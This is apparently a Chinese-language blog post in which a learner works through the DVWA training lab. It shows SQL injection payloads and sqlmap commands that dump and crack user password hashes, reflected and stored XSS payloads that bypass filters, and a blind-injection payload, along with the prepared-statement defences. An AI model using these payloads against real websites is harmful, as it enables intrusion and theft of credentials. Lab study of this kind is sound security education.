---
title: 'DVWA学习'
date: 2019-07-20
updated: 2019-08-20
category: 'vulstudy'
tags:
  - 'wp'
lang: 'zh'
draft: false
---
# DVWA

用的vulstudy的环境  
默认用户名是`admin`密码是`password`  
需要启动的时候`docker-compose up -d`就行了  
停止的话`docker-compose stop`停止容器

## sql注入 最简单的

没办法是我太菜了，权当复习好了 :cry:

输入1得到：  

```
ID: 1
First name: admin
Surname: admin
```

然后开始爆字段

> 1’ order by 2 #

确认回显位置：

> 1’ union select 1,2 #

```
ID: 1' union select 1,2 #
First name: 1
Surname: 2
```

开始爆数据库

> 1’ union select database(),2 #  
> 得到数据库名  
> 
> ```
> ID: 1' union select database(),2 #
> First name: dvwa
> Surname: 2
> ```

开始爆表  
表都存在`information_schema.tables`这里面

> 1’ union select table\_name,2 from information\_schema.tables where table\_schema= ‘dvwa’#

得到：  

```
ID: 1' union select table_name,2 from information_schema.tables where table_schema= 'dvwa'#
First name: guestbook
Surname: 2
ID: 1' union select table_name,2 from information_schema.tables where table_schema= 'dvwa'#
First name: users
Surname: 2
```

开始爆字段  
然而我并不知道怎么爆字段:disappointed:  
于是猜测是`password`

> 1’ union select password,2 from users

得到了：  

```
ID: 1' union select password, 2 from users #
First name: 5f4dcc3b5aa765d61d8327deb882cf99
Surname: 2
ID: 1' union select password, 2 from users #
First name: e99a18c428cb38d5f260853678922e03
Surname: 2
ID: 1' union select password, 2 from users #
First name: 8d3533d75ae2c3966d7e0d4fcc69216b
Surname: 2
ID: 1' union select password, 2 from users #
First name: 0d107d09f5bbe40cade3de5c71e9e9b7
Surname: 2
```

小白之旅到此结束

### 升级到medium

改成了post方式提交数据  
这时候`sqlmap`派上用场了

先将抓到的数据包保存为`dvwa.txt`文件  
然后

> python sqlmap.py -r “dvwa.txt” —dbs

sqlmap很聪明的判断出这是MYSQL数据库并且列出了所有的数据库

```
[22:21:04] [INFO] fetching database names
available databases [4]:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
```

不过这个payload很神奇  

```
Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (1900=1900) THEN 1 ELSE (SELECT 6858 UNION SELECT 6800) END))&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(7517=7517,1))),0x7162787071,0x78))s), 8446744073709551610, 8446744073709551610)))&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1 AND SLEEP(5)&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=1 UNION ALL SELECT CONCAT(0x716b7a6b71,0x464a61616642417872426e5a6c657171445176626c57687143476d6e4d5661714a5768516f4d566a,0x7162787071),NULL-- WDTr&Submit=Submit
```

指定数据库爆表

> python sqlmap.py -r “dvwa.txt” -D dvwa —tables

得到：  

```
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```

指定表爆字段

> python sqlmap.py -r “dvwa.txt” -D dvwa -T users —columns

```
Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+
```

指定表然后dump数据

> python sqlmap.py -r “dvwa.txt” -D dvwa -T users —dump-all

sqlmap很机智的在破解md5  

```
[22:22:02] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
[22:22:04] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'
[22:22:04] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'
```

得到的表  

```
| user_id | avatar                                           | user    | password                                    | last_name | first_name | last_login          | failed_lo
gin |
+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+----------
----+
| 1       | http://192.168.41.161/hackable/users/admin.jpg   | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2019-07-15 13:57:22 | 0            |
| 2       | http://192.168.41.161/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2019-07-15 13:57:22 | 0            |
| 3       | http://192.168.41.161/hackable/users/1337.jpg    | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2019-07-15 13:57:22 | 0            |
| 4       | http://192.168.41.161/hackable/users/pablo.jpg   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2019-07-15 13:57:22 | 0            |
| 5       | http://192.168.41.161/hackable/users/smithy.jpg  | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2019-07-15 13:57:22 | 0            |
+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+
```

sqlmap tql tql tql

### high

这时候就很。。  
![high](https://i.loli.net/2019/07/15/5d2c8e18e504271047.png)

会弹出一个页面，输入数据之后再跳回来  
这就很安全了:stuck\_out\_tongue:  
但是。。  
查看源码之后发现：  
其实没有任何过滤；  

```php
// Check database
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
```

所以payload照样用，没问题

### impossible

这次就更不一般了  

```
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$id = $_GET[ 'id' ];

	// Was a number entered?
	if(is_numeric( $id )) {
		// Check the database
		$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
		$data->bindParam( ':id', $id, PDO::PARAM_INT );
		$data->execute();
		$row = $data->fetch();

		// Make sure only 1 result is returned
		if( $data->rowCount() == 1 ) {
			// Get values
			$first = $row[ 'first_name' ];
			$last  = $row[ 'last_name' ];

			// Feedback for end user
			$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
		}
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

这里用到了PDO预编译的方式  
那可能就真的没办法了

看了下`stackoverflow`  
[How can I prevent SQL injection in PHP?](https://stackoverflow.com/questions/60174/how-can-i-prevent-sql-injection-in-php/60496#60496)

> Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL.

可以有两种方式：  

```
$stmt = $pdo->prepare('SELECT * FROM employees WHERE name = :name');

$stmt->execute(array('name' => $name));

foreach ($stmt as $row) {
    // Do something with $row
}
```

或者对于mysql来说，可以：  

```
$stmt = $dbConnection->prepare('SELECT * FROM employees WHERE name = ?');
$stmt->bind_param('s', $name); // 's' specifies the variable type => 'string'

$stmt->execute();

$result = $stmt->get_result();
while ($row = $result->fetch_assoc()) {
    // Do something with $row
}
```

PDO真的是安全的吗？  
[Are PDO prepared statements sufficient to prevent SQL injection?](https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection)  
[SQL injection that gets around mysql\_real\_escape\_string()](https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602)

## XSS reflected

第一遍在chrome上试了下`<script>alert(1)</script>`没成功  
但是看源码：

![xss0](https://i.loli.net/2019/07/15/5d2c94341de9b41277.png)

可能是chrome太安全了吧  
换成firefox就没事了

![xss1](https://i.loli.net/2019/07/15/5d2c9456115fc37192.png)

### medium

如果看源码就会发现只是简单地对`script`进行了一次过滤

`$name = str_replace( '<script>', '', $_GET[ 'name' ] );`  
那么如何绕过这个限制呢

那就这样构造  
`<scr<script>ipt>alert(1)</script>`  
就能绕过过滤了，主要问题还是过滤不严格，之过滤了一次，所以双写就能很容易地绕过了

ps. 大小写也可以

![xss2](https://i.loli.net/2019/07/15/5d2c954361c0181578.png)

### high

这次过滤更严格了  
`$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );`

最后只留了一个`>`给你

果然我记得还有`img`标签也可以造成xss来着  
`<img src="aa" onError=alert(123) >`  
这样就行啦，当然chrome太安全了，还是用firefox吧

### impossible

```
checkToken( $_REQUEST[ 'user_token' ],$_SESSION[ 'session_token' ], 'index.php' );

// Get input
$name = htmlspecialchars( $_GET[ 'name' ] );

// Feedback for end user
$html .= "<pre>Hello ${name}</pre>";
```

这种情况下还进行了实体编码，看你怎么绕过

[那些年我们没能bypass的xss filter](https://www.leavesongs.com/PENETRATION/xss-collect.html)

一篇总结了xss的文章

## sql 盲注

从low开始看起，  
直接抓包然后将数据包保存起来，用sqlmap跑一下就就出来了，-r参数是读取一个数据包中的文件，然后sqlmap会自动解析它

### mediume

一样的，只是数据包变成了post方式提交的

### high

这次sqlmap抽风没跑出来  
看下源码好了  
本来盲注就是要通过脚本来跑的，但是我比较懒emmm，还是要复习一下如何用python脚本跑出来

如何盲注？

[一篇文章带你深入理解 SQL 盲注](https://www.anquanke.com/post/id/170626#h3-18)

盲注最常见的一个payload  
`127.0.0.1/sqllib/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=80–+` 判断数据库中第一个表的第一个字符为否为’P’

## xss 存储型

还是最简单的low  
表单上的`name`有长度限制，不过这只是前端的限制而已  
`<div id="guestbook_comments">Name: <script>alert(1)</script><br />Message: <script>alert(1)</script><br /></div>`  
注入成功

### medium

这就很尴尬了。。  
原来这就是存储型xss的厉害了，直接存进去了，所以我打开medium的页面时，连着弹出了两个框框，于是想看一下它的源码：

这里也是通过大小写或者双写就能绕过的

`<sCriPt>alert(1)</script>`

找到了一个xss平台

[xss平台](http://xssye.com/index.php?do=project&act=view&id=3761)

但是我发现我不会用了。。
